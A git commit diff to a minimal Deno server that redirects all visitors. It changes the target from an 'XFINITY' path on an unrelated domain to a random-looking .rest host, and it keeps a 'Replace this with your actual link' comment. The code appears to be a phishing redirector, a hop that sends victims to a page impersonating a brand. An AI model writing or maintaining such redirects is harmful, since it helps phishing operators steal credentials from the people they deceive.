d563d4ee38b5befe86836585f178cf820273909a
Digital2025001 <bosmichael30@gmail.com>
2025-07-13 14:49:40 -0700

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://safestepsfoundation.org/XFINITY/s/", // Replace this with your actual link
+      Location: "https://rt.eryrab3.rest/ea/", // Replace this with your actual link
     },
   });
 });
